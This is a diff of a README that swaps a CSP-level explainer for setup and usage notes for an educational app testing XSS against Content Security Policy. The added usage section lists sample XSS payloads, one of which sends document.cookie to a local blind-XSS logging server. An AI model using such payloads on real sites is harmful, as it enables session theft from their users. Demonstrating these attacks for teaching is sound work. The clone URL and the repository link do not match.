@@ -1,107 +1,75 @@
-# Content Security Policy (CSP) Levels 
+# XSS vs CSP: Evaluating Content Security Policy Effectiveness Against XSS Attacks
 
-Content Security Policy is a security feature that helps prevent cross-site scripting (XSS) and other code injection attacks by controlling which resources can be loaded and executed on a web page. CSP uses different directives and values to establish varying levels of security. Here's a breakdown of different CSP levels and the keywords used in each:
+## Project Description
 
-## CSP Levels Overview
+This project demonstrates the impact of Cross-Site Scripting (XSS) vulnerabilities (Stored, Reflected, DOM-based, and Blind XSS) and evaluates the effectiveness of Content Security Policy (CSP) in mitigating these threats. Built with Node.js, Express, and EJS, it features a web application with four pages showcasing different CSP levels (No CSP, Basic, Moderate, Strict), an admin panel to highlight risks to privileged interfaces, and a Blind XSS logging server. The project serves as an educational resource for understanding XSS vulnerabilities and implementing secure web development practices.
 
-### No CSP
-- **Description**: No protection against XSS attacks
-- **Implementation**: No CSP header is set
-- **Vulnerability**: All injection vectors can be exploited
+## Features
 
-### Basic CSP
-- **Description**: Minimal protection that still allows inline scripts
-- **Implementation**: `default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src *; object-src 'none'; base-uri 'self';`
-- **Protection Level**: Blocks some advanced XSS attacks but allows many common vectors
+- **XSS Demonstration Pages**: Four pages with varying CSP configurations to test Stored and Reflected XSS.
+- **DOM-Based XSS Testing**: A dedicated page to showcase vulnerable and secure DOM manipulation methods.
+- **Admin Panel**: Simulates a privileged interface vulnerable to Stored and Blind XSS.
+- **Blind XSS Logging Server**: Captures and logs Blind XSS payloads for analysis.
+- **Main Index Page**: A user-friendly entry point with a card-based interface linking to all components.
 
-### Moderate CSP
-- **Description**: Blocks inline scripts but allows same-origin scripts
-- **Implementation**: `default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self'; object-src 'none'; base-uri 'self'`
-- **Protection Level**: Blocks most XSS attacks but requires script modifications
+## Prerequisites
 
-### Strict CSP
-- **Description**: Uses nonces for script validation and blocks most attack vectors
-- **Implementation**: `default-src 'none'; script-src 'self' 'nonce-{random}'; style-src 'self'; img-src 'self'; connect-src 'self'; font-src 'self'; object-src 'none'; base-uri 'none'; form-action 'self'; frame-ancestors 'none'`
-- **Protection Level**: Highest protection, requiring nonces for all scripts
+- Node.js (v14 or higher)
+- npm (v6 or higher)
 
-## CSP Directive Keywords Explained
+## Installation
 
-### Source Lists
+1. Clone the repository:
 
-- **`'self'`**: Allows resources from the same origin (same domain, protocol, and port)
-- **`'unsafe-inline'`**: Allows inline JavaScript and CSS (opens up XSS vulnerabilities)
-- **`'unsafe-eval'`**: Allows the use of `eval()` and similar functions (security risk)
-- **`'none'`**: Blocks all sources of the specified type
-- **`'nonce-{random}'`**: Allows scripts with a matching nonce attribute (one-time code)
-- **`'strict-dynamic'`**: Allows scripts loaded by trusted scripts (trust propagation)
-- **`*`**: Wildcard that allows resources from any source (weakens security)
-- **`data:`**: Allows data URI schemes (can be exploited)
-- **`https:`**: Allows loading resources only over HTTPS
+   ```bash
+   git clone https://github.com/rishilidha/xss-vs-csp.git
+   cd xss-vs-csp
+   ```
 
-### Resource Directives
+2. Install dependencies:
 
-- **`default-src`**: Fallback for other resource types when they don't have a specific policy
-- **`script-src`**: Controls which scripts can be executed
-- **`style-src`**: Controls which styles can be applied
-- **`img-src`**: Controls which images can be loaded
-- **`connect-src`**: Controls which URLs can be loaded using script interfaces (fetch, XHR)
-- **`font-src`**: Controls which fonts can be loaded
-- **`object-src`**: Controls which plugins can be loaded (Flash, Java)
-- **`media-src`**: Controls which audio and video can be loaded
-- **`frame-src`**: Controls which URLs can be loaded in frames
-- **`worker-src`**: Controls which Workers, SharedWorkers, or ServiceWorkers can be loaded
+   ```bash
+   npm install
+   ```
 
-### Document Directives
+3. Start the application:
 
-- **`base-uri`**: Restricts the URLs that can be used in a document's `<base>` element
-- **`form-action`**: Restricts the URLs that can be used as the target of form submissions
-- **`frame-ancestors`**: Restricts the parents that may embed the page (protects against clickjacking)
-- **`navigate-to`**: Restricts the URLs to which the document can navigate
+   ```bash
+   npm start
+   ```
 
-### Reporting Directives
+   The web application will be accessible at `http://localhost:3000`, and the Blind XSS logging server will run on `http://localhost:9000`.
 
-- **`report-uri`**: Specifies a URL where CSP violations should be reported (deprecated)
-- **`report-to`**: Newer version of report-uri that uses the Report-To HTTP header
+## Usage
 
-## Analyzing Each CSP Level
+1. **Explore XSS Demonstrations**:
+   - Navigate to the main index page (`http://localhost:3000`) and access the CSP demonstration pages (No CSP, Basic, Moderate, Strict).
+   - Test XSS payloads (e.g., `<script>alert('XSS')</script>`, `<img src="x" onerror="alert('XSS')">`) in the comment and Reflected XSS forms.
+2. **Test DOM-Based XSS**:
+   - Visit the DOM-based XSS page and experiment with vulnerable methods (e.g., `innerHTML`) and safe alternatives (e.g., `textContent`).
+3. **Simulate Admin Panel Attacks**:
+   - Access the admin panel to observe how Stored and Blind XSS payloads execute in a privileged context.
+4. **Monitor Blind XSS**:
+   - Inject Blind XSS payloads (e.g., `<img src="x" onerror="fetch('http://localhost:9000/log', {method: 'POST', body: JSON.stringify({data: document.cookie})})">`) and check the logging server (`http://localhost:9000/logs`) for captured data.
 
-### Basic CSP Breakdown
-```
-default-src 'self';                  # Default: only allow same-origin sources
-script-src 'self' 'unsafe-inline';   # Allow same-origin scripts AND inline scripts
-style-src 'self' 'unsafe-inline';    # Allow same-origin styles AND inline styles
-img-src *;                           # Allow images from any source
-object-src 'none';                   # Block plugins like Flash and Java
-base-uri 'self';                     # Restrict <base> element to same origin
-```
+## Project Structure
 
-**Security Impact**: This configuration blocks loading scripts from external domains (except through JSONP or other bypasses) but still allows inline scripts including event handlers, making it vulnerable to many XSS attacks.
+- `views/`: Contains EJS templates for the web application (e.g., `no-csp.ejs`, `dom-xss-form.ejs`, `admin.ejs`).
+- `public/`: Static assets (CSS, JavaScript) for styling and client-side logic.
+- `index.js`: Main server file for the web application and Blind XSS logging server.
+- `routes/`: Defines Express routes for different pages and functionalities.
 
-### Moderate CSP Breakdown
-```
-default-src 'self';                  # Default: only allow same-origin sources
-script-src 'self';                   # Only allow same-origin scripts, NO inline scripts
-style-src 'self';                    # Only allow same-origin styles, NO inline styles
-img-src 'self';                      # Only allow same-origin images
-object-src 'none';                   # Block plugins like Flash and Java
-base-uri 'self';                     # Restrict <base> element to same origin
-```
+## Testing
 
-**Security Impact**: This removes the 'unsafe-inline' exception, blocking inline scripts and event handlers. This configuration blocks most XSS attacks but requires all JavaScript to be in external files.
+- Use browser developer tools to inspect CSP headers and payload execution.
+- Test payloads provided in the project report (e.g., `<svg onload=alert('XSS')>`, `<div onclick="alert('XSS')">Click me</div>`).
+- Verify Blind XSS logs via the `/logs` endpoint on the logging server.
 
-### Strict CSP Breakdown
-```
-default-src 'none';                  # Default: block everything unless explicitly allowed
-script-src 'self' 'nonce-{random}';  # Only allow same-origin scripts with matching nonce
-style-src 'self';                    # Only allow same-origin styles
-img-src 'self';                      # Only allow same-origin images
-connect-src 'self';                  # Only allow same-origin XHR/fetch
-font-src 'self';                     # Only allow same-origin fonts
-object-src 'none';                   # Block plugins like Flash and Java
-base-uri 'none';                     # Block <base> element completely
-form-action 'self';                  # Only allow forms to submit to same origin
-frame-ancestors 'none';              # Block this page from being embedded (anti-clickjacking)
-```
+## Demo
 
-**Security Impact**: This is the most restrictive configuration. The default-src 'none' blocks all resource types unless explicitly allowed. Scripts must have a matching nonce attribute (randomly generated for each page load), preventing inline scripts, event handlers, and unauthorized external scripts.
+- GitHub Repository : https://github.com/rishiiiidha/xss-vs-csp
+- Video Demo : https://drive.google.com/file/d/1dS5R73yPrv0dJ8hl6MBQsW8X-ZykkeHn/view
 
+## Acknowledgments
+
+- **Technologies**: Node.js, Express, EJS, CSS, JavaScript.
